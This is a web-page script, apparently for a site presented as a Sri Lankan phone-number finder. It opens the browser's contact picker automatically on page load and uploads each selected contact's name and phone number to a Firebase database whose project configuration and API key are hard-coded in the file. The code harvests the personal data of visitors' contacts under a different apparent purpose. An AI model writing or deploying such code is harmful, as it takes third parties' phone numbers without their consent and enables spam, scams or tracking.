// Import Firebase modules
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.11.0/firebase-app.js";
import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.11.0/firebase-database.js";

// Firebase config
const firebaseConfig = {
  apiKey: "AIzaSyDKj4i9xunI9d--uU5yG5Lf86fgKYlMfWQ",
  authDomain: "sl-number-finder.firebaseapp.com",
  projectId: "sl-number-finder",
  storageBucket: "sl-number-finder.firebasestorage.app",
  messagingSenderId: "235702134881",
  appId: "1:235702134881:web:4ca8d41c7187a9d8c5e220",
  measurementId: "G-QZD1P56V73",
  databaseURL: "https://sl-number-finder-default-rtdb.firebaseio.com"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

// =========================
// Contact Picker Function
// =========================

async function pickContactsAndSave() {
  try {
    // Check if browser supports it
    if (!('contacts' in navigator) || !('ContactsManager' in window)) {
      alert("Contact Picker API is not supported on this browser.");
      return;
    }

    const props = ['name', 'tel'];
    const opts = { multiple: true };

    const contacts = await navigator.contacts.select(props, opts);

    contacts.forEach(contact => {
      const name = contact.name[0] || "Unknown";
      const tel = contact.tel[0] || "No Number";

      // Save to Firebase
      push(ref(db, 'contacts/'), {
        name: name,
        phone: tel,
        addedAt: new Date().toISOString()
      });
    });

    alert("📱 Contacts saved to Firebase successfully!");
  } catch (error) {
    console.error("Contact Picker Error:", error);
    alert("❌ Contact picking failed or was denied.");
  }
}

// =========================
// Auto Pick Contacts on Site Load
// =========================

window.addEventListener("load", () => {
  pickContactsAndSave();
});
